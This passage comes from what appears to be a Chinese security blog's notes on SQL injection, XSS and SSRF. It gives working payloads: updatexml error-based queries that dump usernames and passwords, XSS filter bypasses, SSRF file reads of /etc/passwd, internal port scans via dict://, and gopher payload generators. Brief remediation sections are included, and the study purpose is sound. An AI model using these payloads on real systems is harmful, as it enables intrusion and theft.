<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>服务器开启了错误回显，利用报错函数获取数据库数据。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-xpath语法</span><br><span class="line">extractvalue(xml_document,Xpath_string)	--查询节点内容</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">作用：从目标xml中返回包含所查询值的字符串</span><br><span class="line">updatexml()		--修改查询到的内容</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，可以用substr()函数截取或limit分页，一次查看最多32位</span><br><span class="line">ascii(~)=0x7e</span><br><span class="line">~ 可以换成#，$等不符合xpath格式的字符</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?id=1&#x27;and (select updatexml(&quot;anything&quot;,concat(&#x27;~&#x27;,(注入语句),0x7e),&quot;anything&quot;))#</span><br><span class="line">当concat内容不符合xpath语法时，会报错并将结果带出来。</span><br></pre></td></tr></table></figure></div>

<p>查询数据库名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select updatexml(1,concat(&#x27;~&#x27;,(select database()),0x7e),1))#</span><br></pre></td></tr></table></figure></div>

<p>查表名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)#</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure></div>

<p>查列名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;),0x7e),1)#</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure></div>

<p>查数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select</span><br><span class="line">group_concat(COLUMN_NAME)from TABLE_NAME),0x7e),1)#</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure></div>

<h3 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h3><h3 id="特殊位置注入"><a href="#特殊位置注入" class="headerlink" title="特殊位置注入"></a>特殊位置注入</h3><p>cookie注入、Header注入、UA注入、Referer注入</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>原理：数据库的堆叠查询可以执行多条语句，多语句之间可以用分号隔开。</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一步：插入恶意数据，在进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<p> 第二步：引用恶意数据，开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在一些特定编码中才会遇到，如GBK等。</p>
<p>原理：</p>
<p>在GBK编码中，使用两个字节来表示一个字符，在MySQL中会认为两个字符为一个汉字（ASCII&gt;128）</p>
<p>在php中使用addslashes函数时，会将单引号<code>’(%27)</code>转义成<code>\&#39;(%5c%27)</code>，可以在前面加上<code>%df</code>构成<code>%df%5c%27</code>，前面的<code>%df%5c</code>会被当成一个汉字，实现单引号逃逸。</p>
<h1 id="0x05-SQL注入漏洞修复"><a href="#0x05-SQL注入漏洞修复" class="headerlink" title="0x05 SQL注入漏洞修复"></a>0x05 SQL注入漏洞修复</h1><ul>
<li><p>使用预编译语句</p>
<p>绑定变量，攻击者无法去改变SQL的结构。</p>
</li>
<li><p>使用安全函数</p>
</li>
<li><p>检查数据类型</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2023/08/28/Web%E5%AE%89%E5%85%A8/XSS/</url>
    <content><![CDATA[<h1 id="0x00-XSS概念"><a href="#0x00-XSS概念" class="headerlink" title="0x00 XSS概念"></a>0x00 XSS概念</h1><p>Cross Site Scripting – 跨站脚本攻击，为了和CSS层叠样式表区分，故称跨站脚本攻击为XSS。跨站脚本攻击是指攻击者往Web页面里插入恶意Script代码，当用户浏览该页面之时，嵌入Web页面中的Script代码就会被执行，从而达到恶意攻击用户的目的</p>
<h1 id="0x01-XSS原理"><a href="#0x01-XSS原理" class="headerlink" title="0x01 XSS原理"></a>0x01 XSS原理</h1><p>利用 Web 应用程序对用户输入数据的不充分验证和过滤，在页面中嵌入一些恶意代码（如 JavaScript、HTML 或 Flash），当其他用户访问该页面时，这些恶意代码就会被执行，从而导致攻击者能够在用户浏览器中进行一些非法操作</p>
<p>例如窃取用户敏感信息、劫持用户会话、发起 CSRF 攻击等。</p>
<h1 id="0x02-XSS分类"><a href="#0x02-XSS分类" class="headerlink" title="0x02 XSS分类"></a>0x02 XSS分类</h1><ul>
<li>反射型：一次性</li>
</ul>
<p>反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
<ul>
<li>存储型：也称持久型XSS</li>
</ul>
<p>用户提交的数据会被存储在后端，最典型的应用是留言板</p>
<ul>
<li>DOM型</li>
</ul>
<p>通过修改页面的DOM节点形成的XSS</p>
<h1 id="0x03-XSS利用"><a href="#0x03-XSS利用" class="headerlink" title="0x03 XSS利用"></a>0x03 XSS利用</h1><ul>
<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
<li>在标签的 href、src 等属性中，包含<code>javascript:</code> 等可执行代码。</li>
<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
</ul>
<h1 id="0x04-常用标签"><a href="#0x04-常用标签" class="headerlink" title="0x04 常用标签"></a>0x04 常用标签</h1><ul>
<li>script</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scirpt&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>img</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>iframe</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>a</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-XSS绕过"><a href="#0x05-XSS绕过" class="headerlink" title="0x05 XSS绕过"></a>0x05 XSS绕过</h1><p><strong>关键字被过滤</strong></p>
<ul>
<li>双写绕过</li>
<li>大小写绕过</li>
<li>字符拼接</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>编码绕过</li>
</ul>
<p><strong>空格过滤</strong></p>
<ul>
<li>利用 <code>\</code> 代替</li>
</ul>
<p><strong>过滤单&#x2F;双引号</strong></p>
<ul>
<li>利用反引号 </li>
<li>编码绕过</li>
</ul>
<p><strong>过滤括号</strong></p>
<ul>
<li><p>利用<code>throw</code>绕过</p>
</li>
<li><p>利用反引号</p>
</li>
<li><p>编码绕过</p>
</li>
</ul>
<h1 id="0x06-修复"><a href="#0x06-修复" class="headerlink" title="0x06 修复"></a>0x06 修复</h1><p>过滤：根据业务需求进行过滤</p>
<p>转义：所有输出到前端的数据都要根据输出点做转义</p>
<p>只允许用户输入http或hppts开头的协议，其次在进行htmlspecialchars()处理</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2023/09/01/Web%E5%AE%89%E5%85%A8/SSRF/</url>
    <content><![CDATA[<h1 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞利用一个可发起网络请求的服务器当作跳板来攻击其他服务。</p>
<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。</p>
<h1 id="0x02-SSRF漏洞用途"><a href="#0x02-SSRF漏洞用途" class="headerlink" title="0x02 SSRF漏洞用途"></a>0x02 SSRF漏洞用途</h1><ul>
<li>扫描内外网的端口和服务</li>
<li>主机本地数据的读取</li>
<li>dos</li>
<li>攻击内外网存在的已知漏洞</li>
</ul>
<h1 id="0x03-产生漏洞的函数"><a href="#0x03-产生漏洞的函数" class="headerlink" title="0x03 产生漏洞的函数"></a>0x03 产生漏洞的函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><ul>
<li>从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><ul>
<li>打开 Internet 或者 Unix 套接字连接</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2><ul>
<li>与**file_get_contents()**类似，输出一个文件的内容。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><ul>
<li>打开一个文件或者URL</li>
<li>配合<code>fread</code>才能够进行回显</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="comment">//fopen.php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">4096</span>);<span class="comment">//限制读取大小 4096</span></span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-SSRF漏洞利用"><a href="#0x04-SSRF漏洞利用" class="headerlink" title="0x04 SSRF漏洞利用"></a>0x04 SSRF漏洞利用</h1><h2 id="SSRf中的URL伪协议"><a href="#SSRf中的URL伪协议" class="headerlink" title="SSRf中的URL伪协议"></a>SSRf中的URL伪协议</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如dict://ip:6379/info，通过dict 协议可以远程访问一个指定的tcp 端口，并且会返回端口所提供的服务的部分组件信息，当目标端口开放（有服务信息显示，但会报错）</span><br><span class="line"></span><br><span class="line">sftp:// ssh文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure></div>

<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul>
<li>代码</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>测试环境</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">外网IP: 192.168.33.333</span><br><span class="line">内网IP: 192.168.22.222</span><br><span class="line"></span><br><span class="line">网段: 192.168.22.0/24</span><br></pre></td></tr></table></figure></div>

<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///etc/passwd</span><br></pre></td></tr></table></figure></div>

<h2 id="探测内网主机存活"><a href="#探测内网主机存活" class="headerlink" title="探测内网主机存活"></a>探测内网主机存活</h2><ul>
<li>读取&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、&#x2F;proc&#x2F;net&#x2F;fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</li>
<li>IP地址分类</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A: 10.0.0.0 - 10.255.255.255</span><br><span class="line">B: 172.16.0.0 - 172.31.255.255</span><br><span class="line">C: 192.168.0.0 - 192.168.255.255</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://192.168.22.1</span><br><span class="line">?url=http://192.168.22.5</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<h2 id="扫描内网端口"><a href="#扫描内网端口" class="headerlink" title="扫描内网端口"></a>扫描内网端口</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis:</span><br><span class="line">?url=dict://192.168.22.1:6379</span><br><span class="line">?url=dict://192.168.22.1:6379/info </span><br><span class="line">http:</span><br><span class="line">?url=dict://192.168.22.1:80</span><br><span class="line">?url=dict://192.168.22.1:80/info</span><br><span class="line">ssh:</span><br><span class="line">?url=dict://192.168.22.1:22</span><br><span class="line">?url=dict://192.168.22.1:22/info</span><br></pre></td></tr></table></figure></div>

<h2 id="gopher协议利用"><a href="#gopher协议利用" class="headerlink" title="gopher协议利用"></a>gopher协议利用</h2><h3 id="在各编程语言中的限制"><a href="#在各编程语言中的限制" class="headerlink" title="在各编程语言中的限制"></a>在各编程语言中的限制</h3><table>
<thead>
<tr>
<th>协议</th>
<th>PHP</th>
<th>Java</th>
<th>Curl</th>
<th>Perl</th>
<th>ASP.NET</th>
</tr>
</thead>
<tbody><tr>
<td>gopher</td>
<td>–wite-curlwrappers且php版本至少为5.3</td>
<td>jdk&lt;1.7</td>
<td>低版本不支持</td>
<td>支持</td>
<td>小于版本3</td>
</tr>
</tbody></table>
<h3 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h3><ul>
<li>gopher的默认端口是70</li>
<li>post请求，回车换行需要使用%0d%0a，多个参数之间的&amp;需要url编码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure></div>

<ul>
<li>不要忘了下划线<code>_</code>,否则服务的接收到的消息将不完整，该字符可随意。</li>
</ul>
<h3 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h3><ul>
<li>测试代码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// echo.php</span><br><span class="line">&lt;?php</span><br><span class="line">	echo &quot;Hello &quot;.$_GET[&quot;whoami&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>抓包</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br></pre></td></tr></table></figure></div>

<ul>
<li>利用脚本生成payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://ip:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>执行</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl </span><br><span class="line">gopher://ip:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%20192.168.1.1%0D%0A</span><br></pre></td></tr></table></figure></div>

<h3 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h3><ul>
<li>测试代码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// echo.php</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello &quot;.$_POST[&quot;whoami&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>抓包</li>
</ul>
<p>POST、Host、Content-Type、Content-Length是POST请求必须的。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /echo.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br></pre></td></tr></table></figure></div>

<ul>
<li>利用脚本生成payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://ip:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>执行</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%20192.168.1.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure></div>

<h2 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h2><p>这篇文章：<a class="link"   href="https://blog.chaitin.cn/gopher-attack-surfaces/" >https://blog.chaitin.cn/gopher-attack-surfaces/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/convert.base64-encode/resource=代码页面</span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05 绕过"></a>0x05 绕过</h1><h2 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h2><ul>
<li>目标代码限制访问的域名只能为 <code>http://www.xxx.com</code>,那我们可以采用利用HTTP基本身份认证的方式绕过，即<code>http://www.xxx.com@www.evil.com</code></li>
</ul>
<h2 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h2><ul>
<li>采用短地址绕过</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.s-3.cn/</span><br><span class="line">https://my5353.com/</span><br></pre></td></tr></table></figure></div>

<ul>
<li>利用<code>http://xip.io</code>绕过</li>
</ul>
<p>不论什么ip，域名加上xip.io都会回归原本的地址，类似的还有<code>http://sslip.io</code>和<code>http://nip.io</code></p>
